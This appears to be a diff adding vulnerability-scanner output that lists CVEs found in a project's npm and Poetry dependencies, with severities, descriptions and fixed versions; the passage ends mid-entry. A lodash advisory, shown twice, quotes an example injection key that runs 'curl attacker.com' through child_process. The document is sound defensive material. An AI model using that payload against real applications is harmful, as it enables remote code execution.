+    ❯❱ follow-redirects - GHSA-r4q5-vmmm-2653
+          Severity: MODERATE                                                                             
+          Affected versions of follow-redirects are vulnerable to Exposure of Sensitive Information to an
+          Unauthorized Actor.                                                                            
+                                                                                                         
+           ▶▶┆ Fixed for follow-redirects at version: 1.16.0
+          3528┆ "node_modules/follow-redirects": {
+   
+    ❯❱ js-yaml - CVE-2026-53550
+          Severity: MODERATE                                                                
+          Affected versions of js-yaml are vulnerable to Inefficient Algorithmic Complexity.
+                                                                                            
+           ▶▶┆ Fixed for js-yaml at versions: 3.15.0, 4.2.0
+          3894┆ "node_modules/gray-matter/node_modules/js-yaml": {
+            ⋮┆----------------------------------------
+          5412┆ "node_modules/js-yaml": {
+   
+    ❯❱ lodash - CVE-2025-13465
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.17.23
+          6080┆ "node_modules/lodash": {
+   
+    ❯❱ lodash - CVE-2026-2950
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          6080┆ "node_modules/lodash": {
+   
+    ❯❱ yaml - CVE-2026-33532
+          Severity: MODERATE                                                 
+          Affected versions of yaml are vulnerable to Uncontrolled Recursion.
+                                                                             
+           ▶▶┆ Fixed for yaml at versions: 1.10.3, 2.8.3
+          7437┆ "node_modules/mrm-core/node_modules/yaml": {
+   
+    ❯❱ next - CVE-2026-44580
+          Severity: MODERATE                                                                          
+          Affected versions of next are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                        
+                                                                                                      
+           ▶▶┆ Fixed for next at versions: 15.5.16, 16.2.5
+          7496┆ "node_modules/next": {
+   
+     ❱ next - CVE-2026-44572
+          Severity: LOW                                                                                   
+          Affected versions of next are vulnerable to Acceptance of Extraneous Untrusted Data With Trusted
+          Data.                                                                                           
+                                                                                                          
+           ▶▶┆ Fixed for next at versions: 15.5.16, 16.2.5
+          7496┆ "node_modules/next": {
+   
+     ❱ next - CVE-2025-48068
+          Severity: LOW                                                                       
+          Affected versions of next are vulnerable to Missing Origin Validation in WebSockets.
+                                                                                              
+           ▶▶┆ Fixed for next at versions: 14.2.30, 15.2.2
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2026-44577
+          Severity: MODERATE                                                                               
+          Affected versions of next are vulnerable to Allocation of Resources Without Limits or Throttling.
+                                                                                                           
+           ▶▶┆ Fixed for next at versions: 15.5.16, 16.2.5
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2026-29057
+          Severity: MODERATE                                                                             
+          Affected versions of next are vulnerable to Inconsistent Interpretation of HTTP Requests ('HTTP
+          Request/Response Smuggling').                                                                  
+                                                                                                         
+           ▶▶┆ Fixed for next at versions: 15.5.13, 16.1.7
+          7496┆ "node_modules/next": {
+   
+     ❱ next - CVE-2025-32421
+          Severity: LOW                                                                                       
+          Affected versions of next are vulnerable to Concurrent Execution using Shared Resource with Improper
+          Synchronization ('Race Condition').                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for next at versions: 14.2.24, 15.1.6
+          7496┆ "node_modules/next": {
+   
+     ❱ next - CVE-2023-46298
+          Severity: LOW                                                                  
+          Affected versions of next are vulnerable to Reliance on Uncontrolled Component.
+                                                                                         
+           ▶▶┆ Fixed for next at version: 13.4.20-canary.13
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2026-27980
+          Severity: MODERATE                                                            
+          Affected versions of next are vulnerable to Uncontrolled Resource Consumption.
+                                                                                        
+           ▶▶┆ Fixed for next at versions: 15.5.14, 16.1.7
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2026-44581
+          Severity: MODERATE                                                                          
+          Affected versions of next are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                        
+                                                                                                      
+           ▶▶┆ Fixed for next at versions: 15.5.16, 16.2.5
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2025-59471
+          Severity: MODERATE                                                                                
+          Affected versions of next are vulnerable to Allocation of Resources Without Limits or Throttling /
+          Uncontrolled Resource Consumption.                                                                
+                                                                                                            
+           ▶▶┆ Fixed for next at versions: 15.5.10, 16.1.5
+          7496┆ "node_modules/next": {
+   
+    ❯❱ picomatch - CVE-2026-33672
+          Severity: MODERATE                                                                           
+          Affected versions of picomatch are vulnerable to Improperly Controlled Modification of Object
+          Prototype Attributes ('Prototype Pollution').                                                
+                                                                                                       
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          9062┆ "node_modules/picomatch": {
+   
+    ❯❱ postcss - CVE-2026-41305
+          Severity: MODERATE                                                                             
+          Affected versions of postcss are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                           
+                                                                                                         
+           ▶▶┆ Fixed for postcss at version: 8.5.10
+          9089┆ "node_modules/postcss": {
+   
+    ❯❱ serialize-javascript - CVE-2026-34043
+          Severity: MODERATE                                                                            
+          Affected versions of serialize-javascript are vulnerable to Excessive Iteration / Uncontrolled
+          Resource Consumption.                                                                         
+                                                                                                        
+           ▶▶┆ Fixed for serialize-javascript at version: 7.0.5
+          11242┆ "node_modules/serialize-javascript": {
+   
+    ❯❱ postcss - CVE-2026-41305
+          Severity: MODERATE                                                                             
+          Affected versions of postcss are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                           
+                                                                                                         
+           ▶▶┆ Fixed for postcss at version: 8.5.10
+          11687┆ "node_modules/tailwindcss/node_modules/postcss": {
+   
+     ❱ tmp - CVE-2025-54798
+          Severity: LOW                                                                                
+          Affected versions of tmp are vulnerable to Improper Link Resolution Before File Access ('Link
+          Following').                                                                                 
+                                                                                                       
+           ▶▶┆ Fixed for tmp at version: 0.2.4
+          11820┆ "node_modules/tmp": {
+   
+    ❯❱ yaml - CVE-2026-33532
+          Severity: MODERATE                                                 
+          Affected versions of yaml are vulnerable to Uncontrolled Recursion.
+                                                                             
+           ▶▶┆ Fixed for yaml at versions: 1.10.3, 2.8.3
+          12432┆ "node_modules/vfile-matter/node_modules/yaml": {
+   
+     ❱ webpack - CVE-2025-68157
+          Severity: LOW                                                                     
+          Affected versions of webpack are vulnerable to Server-Side Request Forgery (SSRF).
+                                                                                            
+           ▶▶┆ Fixed for webpack at version: 5.104.0
+          12487┆ "node_modules/webpack": {
+   
+     ❱ webpack - CVE-2025-68458
+          Severity: LOW                                                                     
+          Affected versions of webpack are vulnerable to Server-Side Request Forgery (SSRF).
+                                                                                            
+           ▶▶┆ Fixed for webpack at version: 5.104.1
+          12487┆ "node_modules/webpack": {
+   
+    ❯❱ yaml - CVE-2026-33532
+          Severity: MODERATE                                                 
+          Affected versions of yaml are vulnerable to Uncontrolled Recursion.
+                                                                             
+           ▶▶┆ Fixed for yaml at versions: 1.10.3, 2.8.3
+          12773┆ "node_modules/yaml": {
+               
+    poetry.lock
+    ❯❱ black - CVE-2024-21503
+          Severity: MODERATE                                                                                
+          Affected versions of black are vulnerable to Failure to Sanitize Special Elements into a Different
+          Plane (Special Element Injection) / Inefficient Regular Expression Complexity.                    
+                                                                                                            
+           ▶▶┆ Fixed for black at version: 24.3.0
+           20┆ name = "black"
+   
+    ❯❱ idna - CVE-2026-45409
+          Severity: MODERATE                                                                    
+          Affected versions of idna are vulnerable to Inefficient Regular Expression Complexity.
+                                                                                                
+           ▶▶┆ Fixed for idna at version: 3.15
+          350┆ name = "idna"
+   
+    ❯❱ jinja2 - CVE-2024-34064
+          Severity: MODERATE                                                                            
+          Affected versions of Jinja2 are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                          
+                                                                                                        
+           ▶▶┆ Fixed for jinja2 at version: 3.1.4
+          414┆ name = "jinja2"
+   
+    ❯❱ jinja2 - CVE-2025-27516
+          Severity: MODERATE                                                                                 
+          Affected versions of Jinja2 are vulnerable to Improper Neutralization of Special Elements Used in a
+          Template Engine.                                                                                   
+                                                                                                             
+           ▶▶┆ Fixed for jinja2 at version: 3.1.6
+          414┆ name = "jinja2"
+   
+    ❯❱ jinja2 - CVE-2024-22195
+          Severity: MODERATE                                                                            
+          Affected versions of jinja2 are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                          
+                                                                                                        
+           ▶▶┆ Fixed for jinja2 at version: 3.1.3
+          414┆ name = "jinja2"
+   
+    ❯❱ jinja2 - CVE-2024-56326
+          Severity: MODERATE                                                         
+          Affected versions of jinja2 are vulnerable to Protection Mechanism Failure.
+                                                                                     
+           ▶▶┆ Fixed for jinja2 at version: 3.1.5
+          414┆ name = "jinja2"
+   
+    ❯❱ jinja2 - CVE-2024-56201
+          Severity: MODERATE                                                                               
+          Affected versions of jinja2 are vulnerable to Improper Neutralization of Escape, Meta, or Control
+          Sequences.                                                                                       
+                                                                                                           
+           ▶▶┆ Fixed for jinja2 at version: 3.1.5
+          414┆ name = "jinja2"
+   
+     ❱ pygments - CVE-2026-4539
+          Severity: LOW                                                                              
+          Affected versions of Pygments are vulnerable to Inefficient Regular Expression Complexity /
+          Uncontrolled Resource Consumption.                                                         
+                                                                                                     
+           ▶▶┆ Fixed for pygments at version: 2.20.0
+          829┆ name = "pygments"
+   
+    ❯❱ pytest - CVE-2025-71176
+          Severity: MODERATE                                                                                 
+          Affected versions of pytest are vulnerable to Creation of Temporary File in Directory with Insecure
+          Permissions.                                                                                       
+                                                                                                             
+           ▶▶┆ Fixed for pytest at version: 9.0.3
+          844┆ name = "pytest"
+   
+    ❯❱ requests - CVE-2024-35195
+          Severity: MODERATE                                                                           
+          Affected versions of requests are vulnerable to Always-Incorrect Control Flow Implementation.
+                                                                                                       
+           ▶▶┆ Fixed for requests at version: 2.32.0
+          983┆ name = "requests"
+   
+    ❯❱ requests - CVE-2023-32681
+          Severity: MODERATE                                                                                  
+          Affected versions of requests are vulnerable to Exposure of Sensitive Information to an Unauthorized
+          Actor.                                                                                              
+                                                                                                              
+           ▶▶┆ Fixed for requests at version: 2.31.0
+          983┆ name = "requests"
+   
+    ❯❱ requests - CVE-2024-47081
+          Severity: MODERATE                                                                   
+          Affected versions of requests are vulnerable to Insufficiently Protected Credentials.
+                                                                                               
+           ▶▶┆ Fixed for requests at version: 2.32.4
+          983┆ name = "requests"
+   
+    ❯❱ requests - CVE-2026-25645
+          Severity: MODERATE                                                      
+          Affected versions of requests are vulnerable to Insecure Temporary File.
+                                                                                  
+           ▶▶┆ Fixed for requests at version: 2.33.0
+          983┆ name = "requests"
+   
+    ❯❱ urllib3 - CVE-2025-50181
+          Severity: MODERATE                                                                                 
+          Affected versions of urllib3 are vulnerable to URL Redirection to Untrusted Site ('Open Redirect').
+                                                                                                             
+           ▶▶┆ Fixed for urllib3 at version: 2.5.0
+          1164┆ name = "urllib3"
+   
+    ❯❱ virtualenv - CVE-2026-22702
+          Severity: MODERATE                                                                               
+          Affected versions of virtualenv are vulnerable to Concurrent Execution using Shared Resource with
+          Improper Synchronization ('Race Condition') / Improper Link Resolution Before File Access ('Link 
+          Following').                                                                                     
+                                                                                                           
+           ▶▶┆ Fixed for virtualenv at version: 20.36.1
+          1246┆ name = "virtualenv"
+                                        
+                                        
+┌──────────────────────────────────────┐
+│ 65 Unreachable Supply Chain Findings │
+└──────────────────────────────────────┘
+                              
+    docs_src/package-lock.json
+   ❯❯❱ axios - CVE-2025-27152
+          Severity: HIGH                                                                                      
+          Affected versions of axios are vulnerable to Server-Side Request Forgery (SSRF). Axios can be       
+          tricked into sending requests to arbitrary domains when provided with an absolute URL—even if a     
+          baseURL is configured—resulting in a potential SSRF and credential leakage vulnerability. If an     
+          attacker can control the URL input, they might cause sensitive headers (such as API keys) to be sent
+          to an unintended destination or gain access to internal network resources. Note that unsanitized    
+          input should NEVER be sent to any axios function, as they all pose a risk of SSRF.                  
+                                                                                                              
+           ▶▶┆ Fixed for axios at versions: 0.30.0, 1.8.2
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2025-58754
+          Severity: HIGH                                                                                    
+          Affected versions of axios are vulnerable to Allocation of Resources Without Limits or Throttling.
+          The Node.js HTTP adapter in Axios blindly decodes data: URIs entirely into memory—ignoring        
+          maxContentLength, maxBodyLength, and even responseType: stream —so an attacker can supply a huge  
+          Base64-encoded data: URL to exhaust heap memory and crash the process (DoS).                      
+                                                                                                            
+           ▶▶┆ Fixed for axios at versions: 0.30.2, 1.12.0
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2024-39338
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Server-Side Request Forgery (SSRF). If the function is
+          building off of a base URL, the attacker can craft a URL that will be requested by the server.     
+                                                                                                             
+           ▶▶┆ Fixed for axios at version: 1.7.4
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2026-42035
+          Severity: HIGH                                                                                      
+          Affected versions of axios are vulnerable to Improper Neutralization of CRLF Sequences in HTTP      
+          Headers ('HTTP Request/Response Splitting') / Improperly Controlled Modification of Object Prototype
+          Attributes ('Prototype Pollution'). When Object.prototype is polluted (anywhere in the dependency   
+          tree) with `Symbol.toStringTag`, `append`, and `getHeaders`, axios's Node.js HTTP adapter mistakes a
+          plain-object body for FormData via a duck-type check and merges the inherited                       
+          `Object.prototype.getHeaders()` return value into the outgoing request headers, allowing an attacker
+          to inject arbitrary headers (e.g. Authorization, Cookie, X-Forwarded-For) into any axios request    
+          that carries a body.                                                                                
+                                                                                                              
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2026-44496
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Inefficient Regular Expression Complexity /           
+          Uncontrolled Resource Consumption. axios is vulnerable to a regular expression denial of service   
+          (ReDoS). The internal `cookies.read()` helper in `lib/helpers/cookies.js` builds a regular         
+          expression by concatenating the cookie name directly into the pattern without escaping regex       
+          metacharacters. When the cookie name flowing into the XSRF cookie read (e.g. via `xsrfCookieName`) 
+          contains a catastrophic-backtracking payload, evaluating the regex against `document.cookie` can   
+          freeze the JavaScript event loop, causing a denial of service in the browser tab or in Node.js/SSR 
+          applications. The affected code path is reached during ordinary axios request processing, so any   
+          importer of an affected version is exposed. Upgrade to a patched version (0.32.0 or 1.16.0), or set
+          `xsrfCookieName: null` to disable XSRF cookie reading.                                             
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.32.0, 1.16.0
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2026-44494
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Improperly Controlled Modification of Object Prototype
+          Attributes ('Prototype Pollution') / Unintended Proxy or Intermediary ('Confused Deputy'). axios   
+          reads `config.proxy` via prototype-chain property access, so any `Object.prototype` pollution      
+          elsewhere in the dependency tree silently routes all HTTP requests through an attacker-controlled  
+          proxy, yielding a full man-in-the-middle. The vulnerability fires on ordinary axios usage with no  
+          specific API call or configuration required; upgrade to axios 1.16.0 or later.                     
+                                                                                                             
+           ▶▶┆ Fixed for axios at version: 1.16.0
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2023-45857
+          Severity: MODERATE                                                             
+          Affected versions of axios are vulnerable to Cross-Site Request Forgery (Csrf).
+                                                                                         
+           ▶▶┆ Fixed for axios at versions: 0.28.0, 1.6.0
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2026-42033
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Improperly Controlled Modification of Object Prototype
+          Attributes ('Prototype Pollution'). Axios do not guard reads of config properties (e.g.            
+          `parseReviver`, `transport`, `transformRequest`, `transformResponse`) with `hasOwnProperty` checks.
+          If `Object.prototype` is polluted by any co-dependency in the same Node.js process, an attacker can
+          install gadgets that silently tamper with and exfiltrate JSON response bodies, or fully hijack the 
+          underlying HTTP transport to capture request URLs, headers, and basic-auth credentials.            
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2025-58754
+          Severity: HIGH                                                                                    
+          Affected versions of axios are vulnerable to Allocation of Resources Without Limits or Throttling.
+          The Node.js HTTP adapter in Axios blindly decodes data: URIs entirely into memory—ignoring        
+          maxContentLength, maxBodyLength, and even responseType: stream —so an attacker can supply a huge  
+          Base64-encoded data: URL to exhaust heap memory and crash the process (DoS).                      
+                                                                                                            
+           ▶▶┆ Fixed for axios at versions: 0.30.2, 1.12.0
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❯❱ axios - CVE-0000-0003
+          Severity: CRITICAL                                                                              
+          Affected versions of this package are vulnerable to Prototype Pollution via the `formDataToJSON`
+          function.                                                                                       
+                                                                                                          
+           ▶▶┆ Fixed for axios at versions: 0.29.0, 1.6.4
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ braces - CVE-2024-4068
+          Severity: HIGH                                                                                     
+          Affected versions of braces are vulnerable to Excessive Platform Resource Consumption within a Loop
+          / Uncontrolled Resource Consumption. The issue resides in `lib/parse.js`. If a malicious user sends
+          imbalanced braces as input, this could lead to Memory Exhaustion.                                  
+                                                                                                             
+           ▶▶┆ Fixed for braces at version: 3.0.3
+          1686┆ "node_modules/braces": {
+   
+   ❯❯❱ cross-spawn - CVE-2024-21538
+          Severity: HIGH                                                                               
+          Affected versions of cross-spawn are vulnerable to Inefficient Regular Expression Complexity.
+                                                                                                       
+           ▶▶┆ Fixed for cross-spawn at versions: 6.0.6, 7.0.5
+          2192┆ "node_modules/cross-spawn": {
+   
+   ❯❯❱ semver - CVE-2022-25883
+          Severity: HIGH                                                                                  
+          Affected versions of semver are vulnerable to Inefficient Regular Expression Complexity. The    
+          vulnerability exists in the package semver allowing Regular Expression Denial of Service (ReDoS)
+          through the `new Range` when untrusted user data is input as a range.                           
+                                                                                                          
+           ▶▶┆ Fixed for semver at versions: 5.7.2, 6.3.1, 7.5.2
+          2448┆ "node_modules/editorconfig/node_modules/semver": {
+            ⋮┆----------------------------------------
+          2993┆ "node_modules/eslint-plugin-react/node_modules/semver": {
+   
+   ❯❯❱ cross-spawn - CVE-2024-21538
+          Severity: HIGH                                                                               
+          Affected versions of cross-spawn are vulnerable to Inefficient Regular Expression Complexity.
+                                                                                                       
+           ▶▶┆ Fixed for cross-spawn at versions: 6.0.6, 7.0.5
+          3295┆ "node_modules/execa/node_modules/cross-spawn": {
+   
+   ❯❯❱ flatted - CVE-2026-32141
+          Severity: HIGH                                                                                    
+          Affected versions of flatted are vulnerable to Uncontrolled Recursion. `flatted.parse()` is       
+          vulnerable to a denial-of-service due to unbounded recursion in its internal `revive()` phase when
+          resolving circular references. A maliciously crafted flatted-JSON payload containing deeply nested
+          and/or self-referential `$` index references can trigger excessive recursion, causing a "Maximum  
+          call stack size exceeded" stack overflow and crashing the Node.js process. Applications that parse
+          untrusted input with `flatted.parse()` can be taken down by an unauthenticated attacker with a    
+          single request.                                                                                   
+                                                                                                            
+           ▶▶┆ Fixed for flatted at version: 3.4.0
+          3517┆ "node_modules/flatted": {
+   
+   ❯❯❱ flatted - CVE-2026-32141
+          Severity: HIGH                                                                                    
+          Affected versions of flatted are vulnerable to Uncontrolled Recursion. `flatted.parse()` is       
+          vulnerable to a denial-of-service due to unbounded recursion in its internal `revive()` phase when
+          resolving circular references. A maliciously crafted flatted-JSON payload containing deeply nested
+          and/or self-referential `$` index references can trigger excessive recursion, causing a "Maximum  
+          call stack size exceeded" stack overflow and crashing the Node.js process. Applications that parse
+          untrusted input with `flatted.parse()` can be taken down by an unauthenticated attacker with a    
+          single request.                                                                                   
+                                                                                                            
+           ▶▶┆ Fixed for flatted at version: 3.4.0
+          3517┆ "node_modules/flatted": {
+   
+   ❯❯❱ flatted - CVE-2026-33228
+          Severity: HIGH                                                                                      
+          Affected versions of flatted are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). The parse() and fromJSON() entry points in flatted    
+          deserialize through parse(); attacker-controlled index strings can be used as array keys without    
+          numeric validation. Crafted payloads using keys such as __proto__ can surface Array.prototype as an 
+          ordinary parsed value; if downstream code assigns properties on that reference, the global prototype
+          chain can be polluted, enabling denial of service or unsafe behavior.                               
+                                                                                                              
+           ▶▶┆ Fixed for flatted at version: 3.4.2
+          3517┆ "node_modules/flatted": {
+   
+    ❯❱ follow-redirects - CVE-2023-26159
+          Severity: MODERATE                                                                                  
+          Affected versions of follow-redirects are vulnerable to Improper Input Validation / Url Redirection 
+          To Untrusted Site ('Open Redirect'). The vulnerability resides in the inadequate input validation of
+          the `url.parse()` function, utilized by the `get` and `request` functions, wherein manipulation can 
+          occur, leading to a misinterpretation of the hostname and enabling an attacker to potentially       
+          redirect traffic to a malicious site, consequently resulting in information disclosure, phishing    
+          attacks, or other security breaches.                                                                
+                                                                                                              
+           ▶▶┆ Fixed for follow-redirects at version: 1.15.4
+          3528┆ "node_modules/follow-redirects": {
+   
+    ❯❱ follow-redirects - CVE-2024-28849
+          Severity: MODERATE                                                                                 
+          Affected versions of follow-redirects are vulnerable to Exposure of Sensitive Information to an    
+          Unauthorized Actor. follow-redirects before 1.15.6 only clears the Authorization and Cookie headers
+          when following a cross-domain redirect, but keeps the Proxy-Authorization header, leaking proxy    
+          credentials to the redirect target host.                                                           
+                                                                                                             
+           ▶▶┆ Fixed for follow-redirects at version: 1.15.6
+          3528┆ "node_modules/follow-redirects": {
+   
+   ❯❯❱ form-data - CVE-2026-12143
+          Severity: HIGH                                                                                      
+          Affected versions of form-data are vulnerable to Improper Neutralization of CRLF Sequences ('CRLF   
+          Injection'). form-data does not escape carriage return, line feed, or double-quote characters in the
+          field name and `filename` option passed to `FormData#append()`. These values are concatenated       
+          directly into the `Content-Disposition` header, so passing untrusted input as a field name or       
+          filename lets an attacker inject CRLF sequences and smuggle additional multipart headers/parts (e.g.
+          overriding backend-trusted fields).                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for form-data at versions: 2.5.6, 3.0.5, 4.0.6
+          3547┆ "node_modules/form-data": {
+   
+   ❯❯❯❱ form-data - CVE-2025-7783
+          Severity: CRITICAL                                                                                 
+          Affected versions of form-data are vulnerable to Use of Insufficiently Random Values. form-data    
+          generates its multipart boundary using Math.random(), which is predictable if an attacker can      
+          observe PRNG outputs. By determining the boundary value, an attacker can embed that boundary in a  
+          user-controlled field and inject arbitrary extra parameters into the multipart payload, potentially
+          manipulating or appending fields in downstream HTTP requests.                                      
+                                                                                                             
+           ▶▶┆ Fixed for form-data at versions: 2.5.4, 3.0.4, 4.0.4
+          3547┆ "node_modules/form-data": {
+   
+    ❯❱ got - CVE-2022-33987
+          Severity: MODERATE                                                                                 
+          Affected versions of got are vulnerable to URL Redirection to Untrusted Site ('Open Redirect'). The
+          vulnerability is the susceptibility to Open Redirect, stemming from the absence of verification for
+          requested URLs, thereby enabling redirection of victims to a UNIX socket.                          
+                                                                                                             
+           ▶▶┆ Fixed for got at versions: 11.8.5, 12.1.0
+          3840┆ "node_modules/got": {
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          5412┆ "node_modules/js-yaml": {
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          5412┆ "node_modules/js-yaml": {
+   
+   ❯❯❱ json5 - CVE-2022-46175
+          Severity: HIGH                                                                                     
+          The parse method of the JSON5 library before and including version 2.2.1 does not restrict parsing 
+          of keys named __proto__, allowing specially crafted strings to pollute the prototype of the        
+          resulting object. This vulnerability pollutes the prototype of the object returned by JSON5.parse  
+          and not the global Object prototype, which is the commonly understood definition of Prototype      
+          Pollution. However, polluting the prototype of a single object can have significant security impact
+          for an application if the object is later used in trusted operations.                              
+                                                                                                             
+           ▶▶┆ Fixed for json5 at versions: 1.0.2, 2.2.2
+          5446┆ "node_modules/json5": {
+   
+    ❯❱ got - CVE-2022-33987
+          Severity: MODERATE                                                                                 
+          Affected versions of got are vulnerable to URL Redirection to Untrusted Site ('Open Redirect'). The
+          vulnerability is the susceptibility to Open Redirect, stemming from the absence of verification for
+          requested URLs, thereby enabling redirection of victims to a UNIX socket.                          
+                                                                                                             
+           ▶▶┆ Fixed for got at versions: 11.8.5, 12.1.0
+          5718┆ "node_modules/libnpx/node_modules/got": {
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          6080┆ "node_modules/lodash": {
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          6080┆ "node_modules/lodash": {
+   
+    ❯❱ micromatch - CVE-2024-4067
+          Severity: MODERATE                                                                                  
+          Affected versions of micromatch are vulnerable to Inefficient Regular Expression Complexity. An     
+          attacker can cause a Regular Expression Denial of Service (ReDoS) by supplying a crafted glob       
+          pattern (an opening brace with no closing brace) to the micromatch brace-expansion functions. The   
+          greedy `/{.*}/` test inside `micromatch.braces()` backtracks excessively and hangs the process. Only
+          `micromatch.braces`, `micromatch.braceExpand`, and `micromatch.parse` route the pattern argument    
+          through this vulnerable code path.                                                                  
+                                                                                                              
+           ▶▶┆ Fixed for micromatch at version: 4.0.8
+          7207┆ "node_modules/micromatch": {
+   
+   ❯❯❱ minimatch - CVE-2026-26996
+          Severity: HIGH                                                                                      
+          Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity.         
+          `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS): if an attacker can supply
+          a glob pattern containing many consecutive `*` wildcards followed by a literal that is absent from  
+          the target string, the generated `RegExp` (many repeated `[^/]*?` groups) can trigger exponential   
+          backtracking in V8, causing a single `minimatch()` call to consume excessive CPU and hang the       
+          process.                                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for minimatch at versions: 10.2.1, 3.1.3, 4.2.4, 5.1.7, 6.2.1, 7.4.7, 8.0.5, 9.0.6
+          7262┆ "node_modules/minimatch": {
+   
+   ❯❯❱ minimatch - CVE-2026-27903
+          Severity: HIGH                                                                                      
+          Affected versions of minimatch are vulnerable to Inefficient Algorithmic Complexity. `minimatch()`  
+          can be forced into extreme CPU usage (event loop starvation / DoS) when matching non‑matching paths 
+          against attacker-controlled glob patterns containing multiple non-adjacent `**` (globstar) segments.
+          In `matchOne()`, each globstar triggers unbounded recursive backtracking over all remaining path    
+          suffixes, with no memoization or budget limit, causing binomial/exponential growth in work and      
+          allowing small crafted patterns to stall a Node.js process for seconds to tens of seconds per call. 
+                                                                                                              
+           ▶▶┆ Fixed for minimatch at versions: 10.2.3, 3.1.3, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7
+          7262┆ "node_modules/minimatch": {
+   
+   ❯❯❱ minimatch - CVE-2026-27904
